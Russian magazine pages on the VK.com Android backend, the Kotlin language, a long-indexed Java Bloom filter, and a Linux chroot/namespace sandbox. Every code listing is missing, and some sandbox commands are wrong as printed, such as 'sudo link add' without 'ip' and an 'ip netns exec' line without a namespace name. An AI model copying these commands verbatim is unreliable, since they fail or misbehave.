обширной родины качество мобильного интернета оставляет желать лучше-
го — операторы связи арендуют друг у друга оборудование, и в пиковые часы
оно бывает тупо перегружено).
   Сейчас в отрасли стандартом де-факто стало использование связки Retrofit
+ OkHttp. Хорошую статью по ее применению ты найдешь здесь. Удобна эта
связка тем, что позволяет работать с сетью как синхронно, так и асинхронно, что
очень важно, поскольку Андроид не дает работать с сетью в главном потоке.
   Разбор ответов сервера делается автоматически, через механизм описа-
ния модели данных. Проиллюстрирую этот процесс кодом. Здесь мы в глав-
ном потоке запрашиваем список новых GIF-картинок для таблички с котами:





Работа с методами API описана в интерфейсе:





Если API сервиса написан сложно, то приходится делать дополнения к пар-
сингу ответов с помощью класса JsonDeserializer. Иногда бывает труд-
но понять, что ушло на сервер, а что вернулось, в этой ситуации нам поможет
HttpLoggingInterceptor. Вот так выглядит рабочий сервис-генератор:





Из описания записи со стены приложения нам нужно получить лишь текст
и ссылку на документ. В тексте содержится разрешение картинки, а ссылка
нужна для загрузки картинки.





Загружать картинку в пользовательский интерфейс можно вручную с помо-
щью AsyncTask. А можно немного полениться и воспользоваться библиотекой
Fresco (от Facebook) или Glide (рекомендует Гугл). Они же позаботятся о кеше
и сэкономят трафик.
   Работа с Glide:





Тут все просто: говорим, откуда грузим картинку, куда вставляем и как работа-
ем с кешем.
   Работа с видео, аудио и базами данных — темы обширные и достойные
отдельных статей. И по этим направлениям андроид-кодеры имеют неплохой
простор для творчества. В качестве БД можно использовать родную SQLite
(кстати, создатели Telegram пересобрали ее и получили нехилый прирост про-
изводительности), кому-то нравится библиотека Realm — по некоторым те-
стам она в разы обгоняет SQLite.
   Если структура данных не очень сложная, то можно наш массив классов со-
хранить как текст (gson) в SharedPreferences:





И восстанавливать его при каждом запуске:





Не забудь подключить библиотеку gson в файле gradle:




ВОТ И ВСЕ
Этой статьей я заканчиваю наш мини-цикл по использованию возможностей
VK.com в качестве бесплатного бэкенда для твоих приложений. Надеюсь, по-
лученные знания помогут тебе написать настоящий шедевр и сэкономить
при этом немного денежек. Удачи и до новых встреч на наших виртуальных
страницах!
 КОДИНГ
КАК ПЕРЕСТАТЬ
КОДИТЬ
НА JAVA
И НАЧАТЬ
ЖИТЬ


 СТО* ПРИЧИН ИЗУЧИТЬ ЯЗЫК
 ПРОГРАММИРОВАНИЯ KOTLIN



 Ребята из JetBrains сделали очень много
 крутых вещей, среди которых Kotlin — моло-
 дой, но очень перспективный язык програм-
 мирования под JVM и Android. В этой статье
                                                                                    Артур Глызин
                                                                                                        forcelain@gmail.com я покажу, чем этот язык может заинтересо-
 вать Android-разработчика и заставить его
 навсегда позабыть про Java.

 JAVA СДАЕТ ПОЗИЦИИ
 Стоит признать, что Java в последнее время развивает-
 ся не очень активно. Новые фишки добавляются в нее
 со скрипом. Отчасти это вызвано тем, что «большая» Java,
  та, что еще называется Java EE, тащит за собой огром-
 ный багаж проектов, которые необходимо беречь при ап-
 грейде на новую версию. Из-за этого появляются новые        INFO
 JVM-совместимые языки программирования,  которые,                                                                         Язык Java назван
 с одной стороны, не обременены обратной совместимо-                                                                                в честь марки кофе,
 стью и могут развиваться очень динамично, а с другой —      которая получила
 могут работать со всей огромной кодовой базой Java: би-     имя от острова Ява
                                                                                в Индонезии. Шутка
 блиотеками, фреймворками, плагинами. И Kotlin — один                                                                                        ли, что существует
 из таких языков.                                                     и остров Котлин? Он
    Эта статья не научит тебя азам и не покажет тебе Hello     находится в Финском
                                                                              заливе около Санкт- world на Kotlin. Она здесь для того, чтобы заинтересовать                                                                                Петербурга, и на нем
 тебя, программиста под Android, новым инструментом     располагается город
 разработки — невероятно гибким, расширяемым и про-         Кронштадт.
 стым.

 ЛАКОНИЧНОСТЬ
  Kotlin очень бережет время программиста и старается сделать так, чтобы тот
 долбил по клавишам как можно реже. Взгляни на этот пример инициализации
 пары переменных на Kotlin:




 Ключевые слова var и val указывают, что ты хочешь объявить переменную или
 константу. При этом тебе не нужно задавать их тип самостоятельно — в боль-
 шинстве случаев Kotlin сам может определить тип переменной по коду. А те-
 перь давай посмотрим на эквивалентный код на Java и найдем менее очевид-
 ные отличия:




 Во-первых, ты наконец-то можешь перестать писать ; в конце каждой строки,
 теперь это не обязательно. Во-вторых, ты избавляешься от ключевого слова
 new перед созданием объекта.
   Еще один отличный пример лаконичности Kotlin — это строковые шабло-
 ны. Вспомни, как Java издевалась над тобой, когда ты хотел составить строку
 с какими-нибудь динамическими данными. Наверняка это выглядело пример-
 но так:





 А теперь забудь это, ведь с механизмом строковых шаблонов на Kotlin ты мо-
 жешь вставлять переменные прямо внутрь строки:



 Ты можешь использовать для составления строки даже вызов метода, если
 обернешь его в фигурные скобки. К примеру:



 Теперь давай рассмотрим пример, непосредственно связанный с Android.
 Сможешь посчитать, сколько раз ты писал вызов findViewById(...)? Я встре-
 чал проекты, в которых их было почти 400!  Конечно, есть ButterKnife, ко-
 торый сделает все за тебя, но даже с ним тебе придется заводить отдель-
 ное поле под каждую вьюшку, чтобы навесить на него аннотацию @BindView.
 В Kotlin все становится еще проще, если подключить стандартный плагин
 kotlin-android-extensions. Этот плагин позволяет, добавив всего одну строчку
 в секции import, получить доступ ко всем вьюшкам, имеющим уникальный ID
 в XML-разметке. Смотри, как это работает.
    Подготовим XML-разметку нашего будущего экрана со всего одной кноп-
 кой, которую назовем pushMe.





 Создадим новую активити с названием MainActivity и установим ей наш лейаут.





 Немного о синтаксисе языка

 В Kotlin нет аннотации @Override, но есть ключевое слово override. Слово
 extends превратилось в двоеточие, а методы (функции) объявляются ключе-
 вым словом fun.



 ОK, теперь, чтобы получить доступ к нашей кнопке, просто добавим еще одну
 строку в секцию импортов:




 И все, теперь мы можем работать с кнопкой:





 Еще одна фишка Kotlin, позволяющая писать меньше кода, — это лямбды. Во-
 обще, лямбда-функции и функции высших порядков (функции, которые могут
 принимать функцию как параметр или возвращать ее) — это очень мощный
 инструмент, который заслуживает отдельной статьи, но в следующем примере
 я покажу тебе, как ты можешь их использовать в разработке под Android, даже
 не зная принципов работы.
    Вот как обычно выглядит установка callback’а на клик по кнопке в Java:





 Здесь создается новый анонимный класс, который реализует интерфейс
 View.OnClickListener, и он сразу передается в качестве параметра в метод
 setOnClickListener(...). Заметь, что у интерфейса View.OnClickListener
 есть всего один метод onClick(View  view), который тебе нужно реализо-
 вать. Эта информация пригодится нам позже.
   А вот как это выглядит в Kotlin:





 Код стал в три раза короче! Все,
 что ты видишь, от первой фигур-
 ной скобки до последней — это
 и есть лямбда-функция. Фокус
 заключается в том, что все ано-
 нимные классы, у которых есть
 только один метод, могут быть
 написаны в Kotlin как лямбды.
    Последнее, о чем я хочу рас-
 сказать тебе, говоря про ком-
 пактность кода в  Kotlin, — это
 property (свойства) классов и ав-
 томатическая  генерация  мето-
 дов. В каждой популярной IDE
 под Java есть функция генера-
 ции  кода,  такого  как  getter’ы,
  setter’ы, toString(), equals(),
 hashCode() и  прочие.  Android     Рис. 1. Диалог генерации кода в Android Studio
  Studio, к слову, умеет генериро-
 вать это все и еще немного боль-
 ше (рис. 1).
    Давай посмотрим на типичный код модельного класса:





 У класса есть одно приватное поле, getter и setter под него, конструктор и еще
 набор стандартных переопределенных методов. Очень много кода генериру-
 ется IDE. А если такой код может генерировать IDE, это может сделать и ком-
 пилятор. Взгляни, насколько проще выглядит аналогичный Kotlin-код:



 Нет, это не опечатка, это действительно эквивалентный класс, и он уместил-
 ся в одну строку. Давай я расскажу подробнее, что здесь происходит. Во-пер-
 вых, конструктор класса объявляется в той же строке, что и сам класс. Во-вто-
 рых, все переданные в конструктор var-параметры будут полями этого класса.
 В-третьих, все неприватные поля класса автоматически получают свои getter-
 и setter-методы. Наконец, ключевое слово data указывает компилятору сгене-
 рировать методы equals(), hashCode(), toString() и copy().
    У методов getter и setter в Kotlin есть одна особенность. Если у класса есть
 одновременно и getter, и setter для какого-либо поля, то в Kotlin такое поле
 считается свойством (property) и для сокращения записи можно использовать
 следующий синтаксис:





 Обрати внимание, что ни в одном из случаев мы не работали с полем User.
 fullName напрямую, только через соответствующие getter -и setter-методы,
 хоть в случае с Kotlin это не так очевидно.

 ОШИБКА НА МИЛЛИАРД
 Многие языки программирования пытаются по-своему решить ошибку на мил-
 лиард долларов, и Kotlin не исключение. Чтобы свести к минимуму возмож-
 ность возникновения NullPointerException, в системе типов Kotlin есть типы
  nullable и non-null. Различаются эти типы знаком вопроса после имени самого
 типа. Это очень похоже на аннотации @Nullable и @NonNull в Java, но в отли-
 чие от последней Kotlin очень строго бдит за работой с типами nullable и non-
  null. К примеру, компилятор не даст тебе записать null в переменную non-
  null типа и не даст выполнить никакую операцию, потенциально приводящую
 к NPE, без предварительной проверки на null:





 Конечно, негуманно заставлять тебя писать такие громоздкие конструкции
 для проверки на null, поэтому в Kotlin есть несколько null-safe-операторов, со-
 кращающих запись:





 РАСШИРЯЕМОСТЬ
 Программируя на  Kotlin, ты смело можешь руководствоваться следующим
 принципом: если тебе чего-то не хватает — напиши это. Kotlin очень гиб-
 кий язык. Во многом за счет своих лямбд, функций высших порядков и функ-
 ций расширения. Про первые две мы уже немного поговорили, теперь узнаем
 про последнюю. С помощью функции расширения (extension function) ты мо-
 жешь добавить возможности уже существующим классам, даже стандартным,
 без изменения их кода. Представь, что тебе надоело писать эту длинную и за-
 частую одинаковую строчку Toast.makeText(context, "Hi there!", Toast.
 LENGTH_SHORT).show(); и ты хотел бы научить Activity делать часть работы са-
 мостоятельно. С функцией расширения в Kotlin это становится реальным:





 Ключевое слово fun говорит о том, что дальше следует определение функ-
 ции (метода, если тебе так привычнее). toast(message:  CharSequence) —
 это имя функции и ее аргументы. В фигурных скобках — тело функции, все
 как обычно. А необычно здесь то, что перед именем функции через точку ука-
 зан класс Activity. Это говорит компилятору, что эта функция теперь являет-
 ся методом Activity, и дает тебе право вызывать ее напрямую у любой Activity:





 Довольно неплохо! Но напоследок я покажу тебе кое-что покруче. Времена-
 ми в программе возникает потребность пройтись по всем вьюшкам и что-то
 с ними сделать. Это выглядит примерно так:





 Проблем с этим кодом и не было бы, если бы его не приходилось частень-
 ко дублировать. Как мы можем улучшить себе жизнь на Kotlin? Комбинацией
 функции расширения и лямбды!





 Да-а, такая конструкция новичку в Kotlin покажется чуждой и сложной. Но если
 разложить все по полочкам... Смотри, с конструкцией fun   ViewGroup.
 loopViews ты уже знаком — это функция расширения для стандартного клас-
 са ViewGroup. Unit — это аналог Void из Java. (action: (View)    Unit)
 говорит компилятору о том, что наша функция принимает на вход в качестве
 аргумента другую функцию (да-да, та самая функция высшего порядка!), у ко-
 торой один аргумент типа View и которая не возвращает ничего (Unit), и имя
 ей — action. В теле нашей основной функции мы проходим по всем своим
 вьюшкам и вызываем над каждой вьюшкой ту функцию, которую нам передали
 в качестве аргумента. Ключевое слово inline тут нужно для оптимизации, что-
 бы не создавать новый объект action на каждый его вызов, сборщику мусора
 потом будет проще.
    ОK, разобрались, но что нам это дает? Это дает возможность писать тако-
 го рода код:





 Видишь? На Kotlin можно написать практически все, чего тебе не хватало
 на Java.

 КАК НАЧАТЬ?
 Хорошая новость: начать писать на Kotlin очень просто. Во-первых, нужно
 установить плагин Kotlin в Android Studio: Settings    Plugins   кнопка Browse
 Repositories   найти плагин Kotlin и установить его. Во-вторых, добавить под-
 держку Kotlin в свой проект: Help   Find Action   впиши в строке поиска kotlin
   выбери пункт Configure Kotlin in Project, как показано на рис. 2, и дальше
 по инструкции. Студия сама добавит нужные строчки в конфиги build.gradle.
 В качестве бонуса в студии появится новая опция, позволяющая автоматиче-
 ски конвертировать существующие Java-классы в Kotlin: Code   Convert Java
  file to Kotlin file.





                                           Рис. 2. Добавляем поддержку Kotlin в проекте

 Вторая хорошая новость: тебе не обязательно переписывать весь свой про-
 ект на Kotlin. Добавив поддержку Kotlin, ты можешь писать новый код на этом
 языке, и он отлично будет работать с твоим кодом на Java. Весь твой Java-код
 останется доступен в Kotlin, все подключенные Java-библиотеки — тоже. Весь
 твой Kotlin-код будет доступен в Java (ну, почти весь).

 ЗАКЛЮЧЕНИЕ
 Я показал тебе только несколько крутых возможностей Kotlin, но за кадром
 осталось еще очень много интересного. Если тебе понравился новый язык
 и ты уже хочешь начать что-то делать самостоятельно, рекомендую заглянуть
 на официальный сайт Kotlin. Там в разделе Learn ты найдешь гайд по азам язы-
  ка, а в разделе Try Online сможешь порешать задачки на Kotlin от элементар-
 ного до экспертного уровня. Удачи!

 * На самом деле меньше, но их все равно достаточно :)
КОДИНГ
МАТЕМАТИКА
ДЛЯ ПРОГРАММИСТА,
ЧАСТЬ 3





РЕАЛИЗУЕМ
ВЕРОЯТНОСТНУЮ
СТРУКТУРУ ДАННЫХ
НА JAVA




В своей прошлой «математической» статье
я пообещал привести пример реализации
того, что, казалось бы, и без нас уже реа-
лизовано :). Это будет не совсем игрушеч-          Виталий                                                                            Худобахшов
ный пример, я взял его из своего реаль-
ного опыта, адаптировав для статьи. Речь пойдет о том,
как реализовать собственную структуру данных, при-
чем не простую, а вероятностную. Постараюсь описать
все просто и понятно, не забыв при этом оставить задел
для усложнения и модернизации.

ВВЕДЕНИЕ
Трудно найти то, что до нас уже не было написано на языке Java. А вот сама
джава была написана сравнительно давно, в те времена, когда два гигабайта
считались весьма солидным размером (здесь была бы уместна старая цита-
та Билла Гейтса про «достаточно каждому» :)). Поэтому адресация массивов,
а также всех адресуемых коллекций в Java позволяет обращаться только при-
мерно к 2 миллиардам элементов. Теперь представим, что тебе нужно сделать
массив из 10 миллиардов элементов... В моем же случае все выглядело еще
хуже, мне была нужна вероятностная структура данных с long-адресацией.
Здесь я постараюсь «крупными мазками» воспроизвести всю задачу целиком,
в результате мы создадим библиотеку для работы с коллекциями, где индексы
могут быть больше, чем int.

ФИЛЬТР БЛУМА
Поставим задачу так: нам нужна структура, называемая фильтром Блума. Она
представляет собой битовый сет, с помощью которого можно определить,
принадлежит ли элемент заданному множеству или нет, не сохраняя сам эле-
мент, а устанавливая лишь небольшое количество битов в этом сете. Конечно,
при такой постановке задачи мы теряем данные, но зато в случае, если данно-
го элемента в этом множестве нет, то мы знаем это точно, что позволяет нам
здорово сэкономить на сравнении, обращении к диску и прочем. Формали-
зуем задачу так: нам нужно сделать класс с методом для добавления объекта
и для проверки того, есть ли он там:





Первый вопрос, который возникает: почему массив байтов? Для ответа на него
начнем с самого начала — постараемся понять, как это вообще работает :).
  В основе алгоритма добавления и проверки в фильтре Блума лежит хеши-
рование. Все алгоритмы хеширования работают с массивами байтов, а то,
как эти массивы были получены из реальных объектов, — совершенно другой
вопрос, который известен как сериализация. Есть соблазн просто сериали-
зовать объект в ByteArrayOutputStream, но я бы так делать не стал: упаковать
объект не получится, если какая-то из его частей не сериализуется, а такое
встречается очень часто. Поэтому если очень хочется, то можно сделать ка-
кой-нибудь специальный интерфейс:




Тогда код с дженериками будет выглядеть примерно так:





Теперь алгоритм. В основе добавления и проверки лежит один и тот же прием:
для каждого объекта сгенерируем некоторое количество хешей и установим
(или проверим) соответствующие биты в битовом сете. Конечно, все это мы
берем по модулю размера нашего битового сета. Если более точно, то нуж-
но сделать хеш положительным и взять остаток от деления на длину битово-
го сета. Ясно, что в случае, когда мы не нашли соответствующие биты, тако-
го объекта точно не было добавлено, однако если биты установлены, то это
не обязательно наш объект — это может быть результат интерференции хе-
шей других объектов.
   Вроде все просто, мы вернемся к деталям реализации чуть позже, а сейчас
попробуем разобраться, что именно для реализации вообще нужно. Для нача-
ла сообразим, зачем нам большой битовый сет.
   Если мы хотим использовать фильтр Блума для большого количества объ-
ектов (десятки миллиардов), то нам нужно много битов для того, чтобы обе-
спечить подходящую точность.
   Таким образом, мы сталкиваемся со следующей проблемой: в нашем рас-
поряжении есть старый добрый java.util.BitSet, но, как и у всех Java-кол-
лекций, индексирование у него int:


Выходит, что для реализации сравнительно простой структуры данных нам
нужно написать битовый сет с адресацией на основе long. Это ведет к тому,
что нам нужны и массивы с такой адресацией.
   Начнем с реализации массивов большей длины. Строго говоря, если бы
даже в Java существовала адресация с помощью long, то я все равно не стал
бы выделять 16 Гбайт одним непрерывным куском, просто потому, что память
может быть фрагментирована и такого большого свободного куска там может
и не быть. Это наводит на мысль, что то, что мы сейчас напишем, актуально
и для повседневных задач. Мы реализуем наши массивы как массивы масси-
вов, то есть как набор кусков, и для каждого индекса мы будем вычислять ин-
декс куска и индекс элемента в куске. Держим в голове, что нам нужен эффек-
тивный битовый сет, а это значит, что массив у нас будет из long:





Здесь LInt2 — это класс для пары элементов типа int:





Для удобства размер куска будем задавать степенью двойки, это позволит
улучшить производительность, заменив деление сдвигом вправо, а вычисле-
ние остатка — двоичным И.
   Если мы хотим реализовать не только массив типа long, но и другие, то име-
ет смысл выделить метод address() в отдельный класс LArray и наследовать
уже от него, так как правила адресации будут одинаковы. Такой подход к адре-
сации вообще позволяет нам сделать много интересного: к примеру, если мы
хотим иметь массив изменяемой длины, то нам всего лишь нужно использо-
вать что-нибудь вроде ArrayList<long[]>() для chunks вместо long[], тог-
да мы сможем спокойно добавлять куски к нашему массиву.
   Теперь, когда у нас есть массив, мы можем сделать битовый сет. Тут до-
ступны несколько вариантов. Можно, конечно, унаследовать битовый сет
от нашего массива, но лучше сделать массив полем. В общем случае мы мог-
ли бы вообще передавать реализацию нашего массива прямо в конструктор.





Для начала требуется определить, сколько нужно элементов в массиве для за-
данного количества битов. Здесь сдвиг вправо на 6 бит — это просто целочис-
ленное деление на 64, так как мы используем long для хранения битов. Теперь
нужно добавить функцию установки бита:





В этом коде тоже нет ничего хитрого, мы просто ставим бит в нужное положе-
ние. Для этого нам нужны младшие 6 бит индекса, которые получаются маски-
рованием index & 63. Последнее эквивалентно вычислению остатка от деле-
ния на 64. Таким образом, 1L << (index & 63) просто дает нам бит в нужном
месте слова. Индекс слова в массиве получается целочисленным делением
(для скорости — сдвигом), как и в случае метода wordRequired.
   Затем нужный бит в слове устанавливается с помощью полученной бито-
вой маски.
   Для того чтобы обнулить бит, реализуем метод unset, который отличается
от предыдущего только последней строкой:


Метод get в таком случае будет также выглядеть тривиально:





В статье мы опустили unit-тесты, которые следует написать, чтобы быть хоть
сколько-нибудь уверенным в том, что код работает правильно.


Таким образом, мы имеем следующее: у нас есть битовый сет, который может
быть сколь угодно большим (насколько позволяет размер кучи в JVM) и впол-
не способен существовать даже в сильно дефрагментированной памяти, если
сделать размер куска достаточно небольшим. А что насчет производительно-
сти? С ней все неплохо — пусть это и не массив, но все еще O(1), причем на-
кладные расходы связаны только с выбором нужного куска массива.
   Как можно догадаться, скорость выполнения кода не зависит от количества
кусков. Правда, тут мы пожертвовали ради простоты и производительности та-
кими вещами, как проверка выхода за границы, но для нашей задачи это несу-
щественно. Более того, мы могли бы сделать массив с ленивой инициализа-
цией (то есть чтобы куски выделялись динамически при первом обращении),
что для битового сета очень актуально. В частности, это не оказало бы суще-
ственного влияния на производительность и было бы куда как более предпоч-
тительно при работе в жадном до памяти окружении.
   Такая реализация формально позволит создать массив размером 256
Гбайт или больше, но если битовый сет использует только 10 Мбайт, то про-
грамма бы использовала именно 10 Мбайт с точностью до размера куска.
   Вооружившись пониманием  алгоритма,  создадим  свой работающий
фильтр Блума.
   Если мы разрабатываем собственную библиотеку, то хочется сделать все
максимально независимо от существующих библиотек. Что нам действитель-
но нужно — это алгоритмы хеширования, тем более что большинство реали-
заций обеспечивают хеш типа int. Подробное рассмотрение этого вопроса
и тем более реализация выходит далеко за пределы этой статьи, так что мы
просто абстрагируем этот механизм. Все, что нам нужно, — стратегия хеши-
рования:




Метод hash() возвращает нужное количество посчитанных хешей для задан-
ного набора байтов. Для тестирования можно реализовать какой-нибудь ва-
риант на основе существующих библиотек, которые
   тебе нравятся больше, к примеру Guava от Google (там есть 128-битовый
murmur-хеш):





Тут мы, конечно, довольно примитивно поработали с salt, но в данном случае
это несущественно.
   Код в примере абсолютно прозрачен и вряд ли требует пояснений, так что
можно сразу перейти к реализации остальных частей:





Это и есть основной код, в котором полностью реализована концепция филь-
тра Блума. Поле mask используется для того, чтобы делать хеши положи-
тельными, если они по какой-то причине таковыми не являются, такая маска
просто «забывает» знаковый бит. В остальном это уже известная нам техни-
ка — для каждого хеша берем остаток от деления на количество битов и полу-
чаем номер бита, который нужно установить. Кажется, работает! Как обычно,
есть нюансы. Фильтр Блума имеет некоторую вероятность ложноположитель-
ных срабатываний, и было бы здорово уметь делать что-то вроде следующего:
«хочу фильтр, который будет давать точность не хуже чем 95%; какого размера
должен быть битовый сет для данного количества элементов, чтобы это рабо-
тало? И как вообще правильно выбрать количество хешей?»
   Оказывается, что для реализации этой задачи уже есть известные форму-
лы, причем желающие могут воспользоваться сервисом для подсчета соот-
ветствующих параметров. Просто напишем статический метод:





Те, кто действительно интересуются вопросом, легко смогут найти способ вы-
вода этих формул.

ЗАКЛЮЧЕНИЕ
Ну вот нам и удалось с минимальными усилиями реализовать фильтр Блума,
да непростой, а с long-адресацией.


Существует  очень много реализаций фильтра Блума  с  int-адресацией
(как на Java, так и на других языках).


С точки зрения математики фильтр Блума представляет собой коммутативный
моноид, что используется в реализации Scala библиотеки algebird от Twitter.
   Эта реализация также интересна тем, что вместе со значением true она
возвращает и вероятность того, что это не ложноположительное срабатывание.
  Моноид — это такая алгебраическая структура, в которой определена ас-
социативная операция, называемая обычно умножением, и есть нейтральный
относительно операции элемент e, то есть такой, что a*e = e*a = a. В нашем
случае роль умножения играет операция битового «или», но для того, чтобы
это реализовать, пришлось бы написать соответствующий код (он есть прак-
тически во всех реализациях битового сета, просто здесь для простоты мы его
опустили).
   Так как a|b совпадает с b|a, то мы имеем коммутативный моноид. Также
ясно, что структура коммутативного моноида индуцирована соответствующей
структурой битового сета (в том смысле, что для начала битовый сет обладает
этой структурой). Код, разобранный в статье, с некоторыми модификациями
и расширениями можно найти на GitHub.


Кстати, фильтры Блума одинакового размера образуют коммутативный моноид.
 UNIXOID
СОБСТВЕННЫЙ





                                                                                   Евгений Зобнин
                                                                                                  zobnin@gmail.com
СОЗДАЕМ ПЕСОЧНИЦУDOCKER
ДЛЯ ПРИЛОЖЕНИЙ
СВОИМИ РУКАМИ





В прошлой статье мы рассмотрели простые решения изо-
 ляции, которые сможет использовать даже самый лени-
 вый и неискушенный пользователь. Но как работают эти
 системы? Какие технологии лежат в их основе и почему
 Docker, не открыв ничего нового, стал настолько популя-
 рен? Попробуем ответить на эти вопросы, а заодно на ко-
 ленке соберем свою собственную песочницу на базе
 ядра Linux.

 ВМЕСТО ВВЕДЕНИЯ
 Для начала разберемся, что же такое эта самая пресловутая песочница, ну
 или контейнер, или изолированное окружение исполнения, кому как больше
 нравится. Фактически все эти термины относятся к одному и тому же типу тех-
 нологий, а именно программным системам, позволяющим запускать приложе-
 ния (или даже целые ОС) в изолированном от основной системы окружении,
 которое не позволит приложению ни увидеть основную систему, ни тем более
 выбраться в нее.
   Один из ранних примеров песочницы — это системный вызов chroot и од-
 ноименная команда. Он появился еще в Version 7 оригинального UNIX в 1979
 году, а в 1982-м перекочевал в BSD. Chroot выполняет очень простую вещь: он
 позволяет сделать так, чтобы корневым каталогом для приложения стал не на-
 стоящий корень, а указанный пользователем (или программистом) каталог.
 В результате приложение оказывается как бы замкнуто внутри этого каталога,
 не зная, что существует что-то за его пределами.
   На примере размещение приложения в chroot выглядит приблизительно так.
 Для начала создаем «корневой» каталог для приложения и копируем его туда:

 $ sudo mkdir ~/sandbox
 $ sudo mkdir ~/sandbox/bin
 $ sudo cp `which ls` ~/sandbox/bin

 Далее выясняем, от каких библиотек зависит приложение, и тоже копируем их
 в chroot. Это необходимо сделать, потому что после запуска в chroot оно про-
 сто не сможет увидеть и, как следствие, загрузить библиотеки основной си-
 стемы.

 $ ldd `which ls`
 linux-vdso.so.1 (0x00007ffe51efd000)
 libcap.so.2 => /usr/lib/libcap.so.2 (0x00007f19da03c000)
 libc.so.6 => /usr/lib/libc.so.6 (0x00007f19d9c9b000)
 /lib64/ld-linux-x86-64.so.2 (0x00007f19da240000)
 $ sudo mkdir -p ~/sandbox/usr/lib
 $ sudo mkdir ~/sandbox/lib64
 $ sudo cp /usr/lib/libcap.so.2 /usr/lib/libc.so.6 ~/sandbox/usr/lib
 $ sudo cp /lib64/ld-linux-x86-64.so.2 ~/sandbox/lib64

 Библиотека linux-vdso.so.1 — виртуальная и входит в состав libc, поэто-
 му ее мы пропускаем. Теперь, когда все готово, можно запустить наш bin/ls
 в chroot:

 $ sudo chroot ~/sandbox /bin/ls -l /
 total 12
 drwxr-xr-x 2 0 0 4096 Jul 12 07:20 bin
 drwxr-xr-x 2 0 0 4096 Jul 12 07:35 lib64
 drwxr-xr-x 3 0 0 4096 Jul 12 07:34 usr

 Как видишь, хотя мы попросили команду ls отобразить содержимое корнево-
 го каталога, нам показали содержимое ~/sandbox. Бинарник ls замкнут в этом
 каталоге, и файлов основной системы для него как бы не существует. Каза-
 лось бы, вот она, песочница для запуска сервисов и небезопасного софта!
 Да, долгое время chroot использовали для этих целей, но есть одна тонкость.
 Для ls виртуальной стала только файловая система (а если точнее — файловая
 иерархия), тогда как все остальные сущности ядра (список процессов, сете-
 вой стек, разделяемая память) остались общими с основной системой. Если
 ты создашь внутри chroot каталог proc, смонтируешь к нему файловую систему
 procfs, а затем закинешь в chroot и запустишь бинарник ps, то обнаружишь, что
 из chroot видно все процессы основной системы. IP-адрес и правила бранд-
 мауэра также останутся неизменными. Приложения, использующие разделяе-
 мую память и другие механизмы IPC, смогут общаться с процессами хост-си-
 стемы. А процесс, работающий в chroot с правами root, сможет легко покинуть
 песочницу.

 УКРЕПЛЯЕМ ПЕСОЧНИЦУ
 Для решения этих проблем во FreeBSD еще в 2000-м году появился механизм
  jail, прозванный «chroot на стероидах». Он позволил отделить процессы ос-
 новной системы от процессов внутри chroot/jail, ограничить доступ к сети и пе-
 ременным ядра, назначить каждому виртуальному окружению собственный
 hostname, а начиная с FreeBSD 9.0 — ограничить использование ресурсов.
    Разработчики Linux пошли несколько другим путем и реализовали концеп-
 цию «пространств имен» (namespaces). Это уже более комплексный и универ-
 сальный механизм, позволяющий выполнить над ресурсами/сущностями ядра
 (список процессов, разделяемая память, сетевой стек) примерно ту же опера-
 цию, что chroot выполняет над файловой иерархией, то есть отрезать выбран-
 ное приложение от основной системы. Существует множество разных типов
 пространств имен:
 •  PID — пространство имен процессов, ограничивает область видимости
    только процессами, которые были порождены самим приложением, и за-
    крывает доступ ко всем остальным процессам системы;
 •  Mount — позволяет монтировать файловые системы так, чтобы они были
    видны только самому приложению и его потомкам;
 •  IPC — отрезает процессы, использующие разделяемую память, семафоры
    и очереди сообщений, от процессов хост-системы;
 •  Network — создает отдельный сетевой стек для приложения и его потом-
     ков, с собственными IP-адресами, правилами брандмауэра, таблицами
    маршрутизации, правилами QoS и так далее;
 •  UTS — позволяет привязать к приложению и потомкам собственное до-
    менное имя;
 •  User — создает собственную таблицу пользователей и групп.

 Красота пространств имен в том, что их очень просто применить. Достаточ-
 но запустить приложение под управлением команды unshare, передав ей не-
 сколько флагов. Попробуй для примера выполнить следующую команду:

 $ sudo unshare -p --fork --mount-proc /usr/bin/ps -aux

 Несмотря на то что мы прямо попросили ps показать все системные процессы
 (флаги -aux), в списке процессов оказывается только сам ps. Такое происхо-
 дит потому, что мы запустили ps в собственном пространстве имен процессов
 (флаг -p и флаги --fork и --mount-proc, чтобы смонтировать /proc по новой
 уже после применения пространства имен). Можешь заменить /usr/bin/ps
 на /usr/bin/top, чтобы убедиться, что top тоже не может «заглянуть» за пре-
 делы пространства имен.





                             Утилита top, запущенная в пространстве имен процессов


 Команда unshare позволяет запускать приложение и в любых других простран-
 ствах имен, поэтому, объединив ее с командой chroot, мы можем создать
 по-настоящему изолированную песочницу:

 $ sudo unshare -piumU --fork --mount-proc chroot ~/sandbox
     /bin/ls -l /

 Эта команда создаст все перечисленные выше пространства имен (кроме се-
 тевого) и запустит /bin/ls внутри них. Это уже почти настоящее виртуальное
 окружение с собственным точками монтирования, юзерами, списком процес-
 сов. Единственное, чего не хватает, — это выделенный сетевой стек (сете-
 вое пространство имен). Его мы создадим с помощью другой команды — ip.
 Но для начала нам нужен виртуальный сетевой мост, который будет служить
 выходом виртуального окружения в сеть.
   Создаем сетевой мост и подключаем его к физическому сетевому интер-
 фейсу eth0 (у тебя его имя, скорее всего, будет другим, запусти ifconfig, чтобы
 узнать точно):

 $ sudo brctl addbr br0
 $ sudo brctl addif br0 eth0
 $ sudo dhcpcd br0

 Далее создаем новое сетевое пространство имен (назовем его sandbox),
 а также пару сцепленных друг с другом виртуальных сетевых интерфейсов
 (veth), один из которых (eth1) пробросим в это пространство имен:

 $ sudo ip netns add sandbox
 $ sudo link add veth1 type veth peer name eth1
 $ sudo link set eth1 netns sandbox

 Подключаем виртуальный сетевой интерфейс к мосту и запускаем dhcpcd
 для получения IP-адреса:

 $ sudo brctl addif br0 veth1
 $ sudo ip link set veth1 up
 $ sudo ip netns exec dhcpcd eth1

 В качестве последнего штриха добавляем в виртуальное окружение адрес
 DNS-сервера (это будет гугловский 8.8.8.8):

 $ sudo mkdir ~/sandbox/etc
 $ sudo echo 'nameserver 8.8.8.8' > ~/sandbox/etc/resolv.conf

 Осталось только запустить наше виртуальное окружение в полученном про-
 странстве имен:

 $ sudo ip netns exec unshare -piumU --fork --mount-proc chroot
     ~/sandbox /bin/ls -l /


 ВОЗДВИГАЕМ СТЕНЫ
 Для примера с /bin/ls это неважно, но настоящее виртуальное окружение
 также должно ограничивать доступные приложению ресурсы, будь то процес-
 сор, память или пропускная способность дисковой подсистемы. Для этих це-
 лей в ядре Linux есть механизм cgroups (control groups), позволяющий объ-
 единить процессы в группы и привязать к ним так называемые контроллеры,
 которые будут ограничивать те или иные ресурсы. Всего существует около де-
